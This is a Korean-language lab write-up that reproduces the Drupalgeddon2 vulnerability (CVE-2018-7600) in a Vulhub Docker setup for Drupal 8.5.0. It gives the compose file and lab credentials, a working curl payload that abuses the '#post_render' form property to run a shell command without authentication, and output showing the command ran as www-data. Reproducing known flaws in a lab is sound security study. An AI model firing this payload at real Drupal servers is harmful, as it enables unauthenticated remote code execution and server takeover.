CVE-2018-7600 - Drupalgeddon2 PoC

개요

취약점 번호: CVE-2018-7600

이름: Drupalgeddon2

설명: Drupal Ajax 폼 렌더링 과정에서 발생하는 RCE 취약점으로 인증 없이 명령어 실행이 가능함.

환경 구성

# 저장소 클론 및 디렉토리 이동
git clone https://github.com/Parkjoonhyeong/vulhub.git
cd vulhub/drupal/CVE-2018-7600

docker-compose.yml 내용 예시

version: '2'
services:
  web:
    image: vulhub/drupal:8.5.0
    ports:
      - "8080:80"
    depends_on:
      - db
  db:
    image: mysql:5.5
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: drupal

# 컨테이너 실행
sudo docker-compose up -d

Drupal 설치 정보

접속 주소: http://localhost:8080

DB 설정:

Database: drupal

Username: root

Password: root

Host: db

Port: 3306

Admin 계정:

ID: root

PW: root1234

PoC 명령어

curl -s -X POST "http://localhost:8080/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"

PoC 결과 예시

[{"command":"insert","method":"replaceWith","selector":null,"data":"uid=33(www-data) gid=33(www-data) groups=33(www-data)..."}]

해당 출력은 명령어 id가 서버에서 실행되어 리눅스 사용자 정보가 응답으로 반환된 결과임.

✅ 취약점 성공적으로 재현됨.

CVE-2018-7600은 Drupal의 폼 시스템에서 발생한 RCE 취약점으로, 인증 없이 서버에 명령어 실행이 가능한 매우 위험한 보안 결함입니다.

본 실습에서는 취약한 Drupal 8.5.0 환경을 Docker로 재현하고, PoC를 통해 id 명령 실행에 성공하였습니다.

실습 결과는 HTTP 응답 본문을 통해 명확히 확인되었으며, 관련 내용은 GitHub 레포에도 반영하였습니다.

7. 참고 자료

NVD - CVE-2018-7600

Drupal 공식 보안 권고

Vulhub PoC 환경
